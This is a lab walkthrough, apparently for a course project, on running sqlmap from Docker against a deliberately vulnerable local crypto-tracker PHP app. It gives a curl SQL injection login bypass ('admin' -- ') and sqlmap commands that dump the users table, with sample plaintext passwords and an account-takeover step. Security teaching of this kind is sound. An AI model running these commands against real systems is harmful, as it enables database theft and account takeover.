# Using sqlmap

`sqlmap` automates finding and exploiting SQL injection. Here it runs in its own
container, so **nothing is installed on your host**. It attacks a vulnerable `q`
parameter and dumps the database — including the plaintext passwords.

> ⚠️ Only ever run this against **this lab app on your own machine**. Using
> sqlmap on systems you don't own is illegal.

---

## Easiest path — the unauthenticated endpoint (`coins.php`)

`coins.php` is a public coin-price lookup with **no login required** and the same
SQLi flaw. Use it and you can skip the whole "get a session cookie" dance below —
just point sqlmap straight at it:

```bash
cd /Users/tanvir/projects/bubt/cybersecurity
docker compose up --build -d      # start web + db

# confirm injection + list databases (NO cookie needed)
docker compose run --rm sqlmap \
  -u "http://web/crypto-tracker/coins.php?q=BTC" \
  --output-dir=/output --batch --dbs

# dump the users table straight away (the money shot)
docker compose run --rm sqlmap \
  -u "http://web/crypto-tracker/coins.php?q=BTC" \
  --output-dir=/output --batch --dump -T users -D crypto_tracker
```

The injection runs on the same DB connection as the rest of the app, so even
though `coins.php` only *shows* the coins table, sqlmap can read **every** table —
including `users` with the plaintext passwords.

The rest of this guide targets `search.php`, which requires a login (Step 1) —
keep it for demonstrating that authenticated endpoints are injectable too, but
`coins.php` above is the quickest way to dump the DB.

---

## Where to run the commands

Any of these work — pick one:
- A normal terminal on your Mac, `cd`'d into the project folder.
- **Docker Desktop → Terminal tab** (bottom of the window) — same thing, a shell
  on your Mac. `cd /Users/tanvir/projects/bubt/cybersecurity` first.

The sqlmap container is defined in `docker-compose.yml` under a `tools` profile,
so it does **not** start with `docker compose up`. You launch it on demand with
`docker compose run`.

---

## One-time: make sure the app is running

```bash
cd /Users/tanvir/projects/bubt/cybersecurity
docker compose up --build -d          # starts web + db (not sqlmap)
```

---

## Step 1 — get an authenticated session

`search.php` requires a login, so sqlmap needs a valid session cookie. The
quickest way is to grab one using the SQLi login bypass itself:

```bash
SID=$(curl -s -i -c - \
  --data-urlencode "username=admin' -- " \
  --data-urlencode "password=x" \
  http://localhost/crypto-tracker/login.php | awk '/PHPSESSID/{print $7}' | tr -d '\r')
echo "$SID"
```

`$SID` now holds a valid `PHPSESSID`. (Alternatively: log in through the browser,
open DevTools → Application → Cookies, and copy the `PHPSESSID` value by hand.)

---

## Step 2 — confirm the injection and list databases

Note the target host is **`web`** (the app's service name on the Docker network),
not `localhost` — because sqlmap runs inside the Docker network.

```bash
docker compose run --rm sqlmap \
  -u "http://web/crypto-tracker/search.php?q=BTC" \
  --cookie="PHPSESSID=$SID" \
  --output-dir=/output \
  --batch --dbs
```

- `--batch` — accept all default prompts (non-interactive).
- `--output-dir=/output` — save results to the mounted host folder
  `./sqlmap-output/`.
- `--rm` — remove the throwaway container when it exits.

You'll see `q` reported as injectable (boolean-based, error-based, time-based)
and a list of databases including **`crypto_tracker`**.

---

## Step 3 — dump the users table (the money shot)

```bash
docker compose run --rm sqlmap \
  -u "http://web/crypto-tracker/search.php?q=BTC" \
  --cookie="PHPSESSID=$SID" \
  --output-dir=/output \
  --batch --dump -T users -D crypto_tracker
```

Expected output:

```
Table: users
[3 entries]
+----+-----------+----------+---------------------+---------------+
| id | password  | username | created_at          | display_name  |
+----+-----------+----------+---------------------+---------------+
| 1  | admin123  | admin    | ...                 | Administrator |
| 2  | password1 | alice    | ...                 | Alice         |
| 3  | qwerty    | bob      | ...                 | Bob           |
+----+-----------+----------+---------------------+---------------+
```

✅ **Plaintext passwords recovered.** Log into the app as any of them to
demonstrate account takeover — this is the SQLi → plaintext-creds chain.

---

## Where the evidence goes

With `--output-dir=/output`, sqlmap writes to `./sqlmap-output/` on your Mac:

```
sqlmap-output/
└── web/
    └── dump/crypto_tracker/users.csv     # the dumped table (CSV)
```

Open the CSV or screenshot the terminal table for the report.

---

## Useful variations

```bash
# List tables in the app's database
docker compose run --rm sqlmap -u "http://web/crypto-tracker/search.php?q=BTC" \
  --cookie="PHPSESSID=$SID" --output-dir=/output --batch -D crypto_tracker --tables

# Dump every table in the database
docker compose run --rm sqlmap -u "http://web/crypto-tracker/search.php?q=BTC" \
  --cookie="PHPSESSID=$SID" --output-dir=/output --batch -D crypto_tracker --dump

# Show the current DB user / version / current database
docker compose run --rm sqlmap -u "http://web/crypto-tracker/search.php?q=BTC" \
  --cookie="PHPSESSID=$SID" --output-dir=/output --batch --current-user --current-db --banner
```

---

## Prefer sqlmap on your host instead?

If you already have sqlmap installed on your Mac/Kali, skip the container and
target `localhost` directly (no `web` hostname):

```bash
sqlmap -u "http://localhost/crypto-tracker/search.php?q=BTC" \
       --cookie="PHPSESSID=$SID" --batch --dump -T users -D crypto_tracker
```

---

## Troubleshooting

- **sqlmap redirects to `login.php` / finds nothing** — your session expired or
  the cookie is wrong. Re-run Step 1 to get a fresh `$SID`.
- **"connection refused" / can't reach `web`** — the app isn't running; do
  `docker compose up -d` first. Inside the container the host is `web`, never
  `localhost`.
- **Empty `./sqlmap-output`** — you forgot `--output-dir=/output`; sqlmap wrote
  to its default location inside the container instead.
- **Windows/line-ending oddities in `$SID`** — the `tr -d '\r'` in Step 1 handles
  that; make sure you copied the whole command.
